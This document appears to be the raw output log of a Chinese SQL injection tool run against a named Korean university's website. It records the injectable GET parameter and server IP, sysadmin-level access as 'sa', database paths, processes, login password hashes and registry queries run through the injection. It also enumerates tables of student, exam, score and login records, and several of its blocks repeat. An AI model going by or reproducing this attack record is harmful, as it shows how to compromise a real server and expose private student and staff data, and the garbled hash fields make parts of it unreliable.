@@ -1,0 +1,591 @@
+■漏洞信息:============================================================
+ ·URL:http://www.hanmin.ac.kr/photo/detail.asp?ID=hanmin&page=1&Serial=4
+ ·页面标题：茄刮切背-Hanmin University
+ ·参数:ID=hanmin&page=1&Serial=4
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.225.7.2
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.0
+Date: Mon, 04 Apr 2011 08:20:12 GMT
+Connection: Keep-Alive
+Content-Length: 29218
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 08:20:12 GMT
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+
+■数据库信息:============================================================
+- 数据库名：hanmin
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：AD8A898457E9472
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+hanmin	C:\Program Files\Microsoft SQL Server\MSSQL\data\hanmin_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+Internet Information Services	sleeping	AD8A898457E9472	832	AWAITING COMMAND		
+Internet Information Services	sleeping	AD8A898457E9472	832	AWAITING COMMAND		
+Internet Information Services	sleeping	AD8A898457E9472	832	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+AD8A898457E9472	SQL Server	SQLOLEDB	AD8A898457E9472		AD8A898457E9472	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		03  8 2006  8:03AM	03  8 2006  8:03AM	
+admin	?嘹??哽橪??????剴??爃???綟?燏	1	茄惫绢	04  8 2006  6:13PM	08 14 2010  3:14PM	
+blank	???棐?硻?????繩??????摵??	1	茄惫绢	05  5 2010 11:15PM	05  5 2010 11:15PM	
+BUILTIN\Administrators		1	茄惫绢	03  8 2006  8:03AM	11 17 2010 11:36AM	
+hanmin	???????洪??樟?钢蜮燮?漥????	7	茄惫绢	04  8 2006  3:57PM	03 30 2011 11:41AM	
+sa	┶嗫?繐试?凫操??紝????檒嬫???耏脘	1	茄惫绢	08  6 2000  1:27AM	03 30 2011 11:41AM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+
+■数据库信息:============================================================
+- 数据库名：hanmin
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：AD8A898457E9472
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+hanmin	C:\Program Files\Microsoft SQL Server\MSSQL\data\hanmin_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+MS SQLEM	sleeping	AD8A898457E9472	2672	AWAITING COMMAND	Administrator	
+Internet Information Services	runnable	AD8A898457E9472	832	SELECT		
+	background			TASK MANAGER		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+AD8A898457E9472	SQL Server	SQLOLEDB	AD8A898457E9472		AD8A898457E9472	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		03  8 2006  8:03AM	03  8 2006  8:03AM	
+admin	?嘹??哽橪??????剴??爃???綟?燏	1	茄惫绢	04  8 2006  6:13PM	08 14 2010  3:14PM	
+blank	???棐?硻?????繩??????摵??	1	茄惫绢	05  5 2010 11:15PM	05  5 2010 11:15PM	
+BUILTIN\Administrators		1	茄惫绢	03  8 2006  8:03AM	11 17 2010 11:36AM	
+hanmin	???????洪??樟?钢蜮燮?漥????	7	茄惫绢	04  8 2006  3:57PM	03 30 2011 11:41AM	
+sa	┶嗫?繐试?凫操??紝????檒嬫???耏脘	1	茄惫绢	08  6 2000  1:27AM	03 30 2011 11:41AM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+
+■数据库信息:============================================================
+- 数据库名：hanmin
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：AD8A898457E9472
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+hanmin	C:\Program Files\Microsoft SQL Server\MSSQL\data\hanmin_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+MS SQLEM - Data Tools	sleeping	AD8A898457E9472	2240	AWAITING COMMAND	Administrator	
+MS SQLEM - Data Tools	sleeping	AD8A898457E9472	2240	AWAITING COMMAND	Administrator	
+MS SQLEM	sleeping	AD8A898457E9472	2240	AWAITING COMMAND	Administrator	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+AD8A898457E9472	SQL Server	SQLOLEDB	AD8A898457E9472		AD8A898457E9472	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		03  8 2006  8:03AM	03  8 2006  8:03AM	
+admin	?嘹??哽橪??????剴??爃???綟?燏	1	茄惫绢	04  8 2006  6:13PM	08 14 2010  3:14PM	
+blank	???棐?硻?????繩??????摵??	1	茄惫绢	05  5 2010 11:15PM	05  5 2010 11:15PM	
+BUILTIN\Administrators		1	茄惫绢	03  8 2006  8:03AM	11 17 2010 11:36AM	
+hanmin	???????洪??樟?钢蜮燮?漥????	7	茄惫绢	04  8 2006  3:57PM	03 30 2011 11:41AM	
+sa	┶嗫?繐试?凫操??紝????檒嬫???耏脘	1	茄惫绢	08  6 2000  1:27AM	03 30 2011 11:41AM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+Dir of C:: 
+
+
+b■ver
+
+■数据库信息:============================================================
+ ·BasicInfo: 
+CurrentDatabase
+UserName
+Version
+ServerName
+ServiceName
+SystemUser
+SystemTime
+
+ ·UserRoles: 
+IS_sysadmin
+IS_dbcreator
+IS_bulkadmin
+IS_diskadmin
+IS_serveradmin
+IS_public_
+IS_db_owner_
+IS_db_backupoperator_
+IS_db_datawriter
+
+ ·Users: 
+uid	status	name	sid	roles
+
+
+ ·Databases: 
+name	filename
+
+
+ ·sysServers: 
+srvname	srvproduct	datasource	location	providerstring	srvnetname
+
+
+ ·Database login users: 
+name	password	sid	xstatus
+
+
+■数据库服务器IP地址：111.172.36.66
+■数据库服务器IP地址：111.172.36.66
+■数据库服务器IP地址：111.172.36.66
+■数据库服务器IP地址：211.225.7.2   
+■数据库服务器IP地址：211.225.7.2
+Dir of C:: 
+
+
+Dir of D:: 
+
+
+Dir of C:: 
+DBConnectionIsNull■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+
+■数据库信息:============================================================
+- 数据库名：hanmin
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：AD8A898457E9472
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+hanmin	C:\Program Files\Microsoft SQL Server\MSSQL\data\hanmin_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+Internet Information Services	runnable	AD8A898457E9472	832	SELECT		
+Internet Information Services	runnable	AD8A898457E9472	832	SELECT		
+Internet Information Services	sleeping	AD8A898457E9472	832	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+AD8A898457E9472	SQL Server	SQLOLEDB	AD8A898457E9472		AD8A898457E9472	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		03  8 2006  8:03AM	03  8 2006  8:03AM	
+admin	?嘹??哽橪??????剴??爃???綟?燏	1	茄惫绢	04  8 2006  6:13PM	08 14 2010  3:14PM	
+blank	???棐?硻?????繩??????摵??	1	茄惫绢	05  5 2010 11:15PM	05  5 2010 11:15PM	
+BUILTIN\Administrators		1	茄惫绢	03  8 2006  8:03AM	11 17 2010 11:36AM	
+hanmin	???????洪??樟?钢蜮燮?漥????	7	茄惫绢	04  8 2006  3:57PM	03 30 2011 11:41AM	
+sa	┶嗫?繐试?凫操??紝????檒嬫???耏脘	1	茄惫绢	08  6 2000  1:27AM	03 30 2011 11:41AM	
+
+------------------------------------------------------------
+正在获取数据库 [hanmin] 的表名……
+一次性获取失败，正在批次获取……
+ board_campus_file_tab
+board_campus_tab
+board_club_file_tab
+board_club_tab
+board_contest_file_tab
+division_master_tab
+document_issue_tab
+board_contest_point_tab
+board_contest_reply_tab
+board_contest_tab
+board_enter_file_tab
+board_major_file_tab
+board_preach_tab
+board_major_tab
+board_staff_file_tab
+board_staff_file_tab_annex
+syscommand
+board_staff_tab
+board_stud_file_tab
+board_stud_tab
+D99_CMD
+board_subject_file_tab
+D99
+board_subject_tab
+bonus_list_tab
+certificate_detail_tab
+D99_Tmp
+certificate_history_tab
+round_tab_bak
+user_info_tab
+certificate_list_tab
+certificate_master_tab
+change_req_tab
+t_t
+chat_memo_tab
+chat_room_list_tab
+chat_users_tab
+club_genmng_tab
+club_master_tab
+club_member_tab
+country_code_tab
+debate_file_tab
+debate_tab
+department_cheif_tab
+X_4500
+department_history_tab
+department_master_tab
+division_history_tab
+exam_answer_obj_tab
+exam_answer_sub_file_tab
+exam_answer_sub_tab
+exam_answer_tab
+exam_info_tab
+exam_question_file_tab
+exam_question_obj_tab
+exam_question_sub_tab
+exam_question_tab
+exit_req_tab
+graduate_info_tab
+highschool_code
+highschool_division_code
+highschool_neis
+incorporate_stud_tab
+incorporate_subject_tab
+jiwonja2003
+jiwonja2003_m
+lecture_center_tab
+major_master_tab
+lecture_plan_tab
+lecture_stud_score_tab
+major_history_tab
+major_master_tab(归诀)
+major_master_tab-1
+major_point_tab
+memo_midi_tab
+memo_tab
+menu_secure_tab
+menu_master_tab
+pass_stud_tab
+progress_check_tab
+poll_list_tab
+progress_check_admin_tab
+poll_master_tab
+position_code_tab
+post_code_tab
+prof_tab
+t_jiaozhu
+progress_check_time_admin_tab
+progress_check_time_tab
+qna_file_tab
+qna_tab
+D99_REG
+X_4404
+quiz_file_tab
+quiz_info_tab
+quiz_reply_tab
+reg_fee_info_tab
+reg_fee_pay_tab
+DIY_TEMPCOMMAND_TABLE
+reg_stud_tab
+register_lec_auto_tab
+register_lec_tab
+report_file_tab
+report_reply_file_tab
+return_req_tab
+report_info_tab
+subject_detail_tab
+round_tab
+report_reply_tab
+round_file_tab
+scholarship_tab
+school_plan_tab
+score_etc_info_tab
+score_rate_tab
+staff_tab
+FEELKOREAN_Photo
+stud_association_member_tab
+FEELKOREAN_PhotoAlbum
+stud_id_new_tab
+FEELKOREAN_PhotoReply
+student_card_info
+board_enter_tab
+student_history_tab
+subject_book_tab
+subject_file_file_tab
+major_cheif_tab
+subject_file_tab
+student_tab
+subject_master_tab
+total_score_tab
+sysindexs
+user_login_tab
+vote_join_tab
+vote_master_tab
+vote_sub_tab
+vsHeigh_school
+zipcode_030919
+apply_fee_pay_tab
+incorporate_graduate_VIEW
+absent_info_tab
+stud_graduate_VIEW
+apply_stud_tab2003
+prof_account_view
+apply_stud_tab
+subject_stud_score_view
+assistant_tab
+dtproperties
+board_association_file_tab
+board_association_tab
+board_bachelor_file_tab
+board_bachelor_tab
+board_cafe_file_tab
+board_cafe_tab
+
+------------------------------------------------------------
+正在获取 [hanmin].[user_login_tab] 的列名……
+ id
+login_serial
+login_time
+logout_time
+use_os
+use_hour
+use_minute
+use_second
+use_ip
+use_state
+use_session
+
+------------------------------------------------------------
+正在获取 [hanmin].[pass_stud_tab] 的列名……
+ apply_year
+apply_num
+apply_dept
+apply_major
+reg_fee_flag
+
+
+■数据库信息:============================================================
+- 数据库名：hanmin
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：AD8A898457E9472
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+hanmin	C:\Program Files\Microsoft SQL Server\MSSQL\data\hanmin_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	AD8A898457E9472	1504	AWAITING COMMAND	SYSTEM	
+MS SQLEM	sleeping	AD8A898457E9472	2604	AWAITING COMMAND	Administrator	
+Internet Information Services	sleeping	AD8A898457E9472	832	AWAITING COMMAND		
+Internet Information Services	sleeping	AD8A898457E9472	832	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+AD8A898457E9472	SQL Server	SQLOLEDB	AD8A898457E9472		AD8A898457E9472	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		03  8 2006  8:03AM	03  8 2006  8:03AM	
+admin	?嘹??哽橪??????剴??爃???綟?燏	1	茄惫绢	04  8 2006  6:13PM	08 14 2010  3:14PM	
+blank	???棐?硻?????繩??????摵??	1	茄惫绢	05  5 2010 11:15PM	05  5 2010 11:15PM	
+BUILTIN\Administrators		1	茄惫绢	03  8 2006  8:03AM	11 17 2010 11:36AM	
+hanmin	???????洪??樟?钢蜮燮?漥????	7	茄惫绢	04  8 2006  3:57PM	03 30 2011 11:41AM	
+sa	┶嗫?繐试?凫操??紝????檒嬫???耏脘	1	茄惫绢	08  6 2000  1:27AM	03 30 2011 11:41AM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
